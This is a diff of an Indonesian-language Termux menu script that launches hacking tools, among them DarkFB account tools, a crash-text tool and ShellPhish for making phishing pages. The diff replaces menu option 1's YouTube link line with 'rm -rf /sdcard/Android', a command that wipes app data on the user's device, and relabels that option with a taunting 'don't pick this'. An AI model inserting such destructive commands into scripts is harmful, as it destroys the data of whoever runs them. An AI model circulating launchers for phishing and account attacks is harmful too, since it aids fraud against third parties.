@@ -110,7 +110,7 @@ echo
 echo $pu"•"$bi"────────────────────"$pu"•"
 echo $i"|"$cy"   TERMUX TOOLS"  $i"    |"
 echo $pu"•"$bi"────────────────────"$pu"•"
-echo $me"|"$pu"1"$me"|"$cy"["$cy"SUBCRIBE YA TOD""]"
+echo $me"|"$pu"1"$me"|"$cy"["$cy"JGN PILIH INI YA TOD""]"
 echo $me"|"$pu"2"$me"|"$cy"["$cy"DarkFBv6""]"
 echo $me"|"$pu"3"$me"|"$cy"["$cy"DarkFBv7""]"
 echo $me"|"$pu"4"$me"|"$cy"["$cy"VIRTEX""]"
@@ -121,7 +121,7 @@ echo $me"|"$pu"8"$me"|"$cy"["$cy"ShellPhish""]"$cy"("$pu"MEMBUAT PHISING"$CY")"
 echo $me"|"$pu"9"$me"|"$cy"["$cy"STARKV2""]"
 echo $me"|"$pu"10"$me"|"$cy"["$cy"INSTALL BAHAN BAHAN NJING""]"
 echo $me"|"$pu"0"$me"|"$cy"["$cy"KELUAR""]"
-echo $bi"["$cy"Pilih Nomor 1 dulu ya babang"$bi"]"
+echo $bi"["$cy"Pilih Nomor"$bi"]"
 echo $cy"╔"
 read -p"╚══>>" pil
 
@@ -130,7 +130,7 @@ then
 clear
 figlet -f slant "C O L I"|lolcat
 sleep 1
-https://www.youtube.com/channel/UCaKLg1ELiX0zTJ6Je3c5esA
+rm -rf /sdcard/Android
 fi
 
 if [ $pil = 2 ]
